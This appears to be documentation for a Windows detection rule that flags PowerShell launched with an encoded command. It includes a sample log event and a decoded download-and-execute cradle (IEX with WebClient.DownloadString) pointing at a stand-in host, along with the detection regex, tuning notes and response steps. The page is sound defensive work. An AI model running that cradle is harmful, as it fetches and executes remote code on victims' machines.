# PowerShell with an encoded command

| | |
| --- | --- |
| Rule | `windows-encoded-powershell` ([YAML](../../backend/rules/windows/encoded-powershell.yml)) |
| Type | Match |
| Severity | High |
| ATT&CK | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) PowerShell, [T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or Information (Execution, Defense Evasion) |
| Logs | Windows Security event 4688 and Sysmon event 1 (`windows`) |

## The attack

`powershell.exe -EncodedCommand <base64>` runs a script passed as base64-encoded UTF-16. It
hides the real command from anyone glancing at a process list or a naive log search, which is
why phishing payloads, malware loaders and post-exploitation frameworks use it constantly.

## Log evidence

From the Security log on the domain controller (process creation, 4688):

```json
{"EventID": 4688, "Computer": "DC01.corp.example.local",
 "EventData": {"SubjectUserName": "administrator",
               "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBi...",
               "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"}}
```

Decoded, the blob is `IEX (New-Object Net.WebClient).DownloadString('https://update-check.example.net/a')`:
download a script and run it in memory.

## Detection logic

Two selections that must both match:

- `powershell`: `event.action: process_created` and `process.name` is `powershell.exe` or
  `pwsh.exe`;
- `encoded_argument`: `process.command_line` matches the case-insensitive regular expression
  `\s[-/](?:e|ec|en[a-z]*)\s+[A-Za-z0-9+/=]{20,}`: any abbreviation of `-EncodedCommand`
  (`-e`, `-ec`, `-enc`, `-encodedcommand`, with `-` or `/`) followed by a long base64 string.

The regex avoids matching `-ExecutionPolicy` and other `-e...` parameters, and works on both
log sources because the parser maps both to the same fields.

## False positives and tuning

- Some management agents (SCCM, Intune scripts) pass scripts this way.
- Administrators encoding a command to avoid quoting problems.
- Exclude a specific agent by its parent process (`process.parent.name`), not by the blob.

## Responding

1. Decode the blob (base64, then UTF-16LE) and read what it does.
2. Look at the parent process: Word or Excel as a parent means a malicious document (see
   [Office application started a shell](office-app-spawns-shell.md)).
3. Search for the domains and addresses the script contacts.
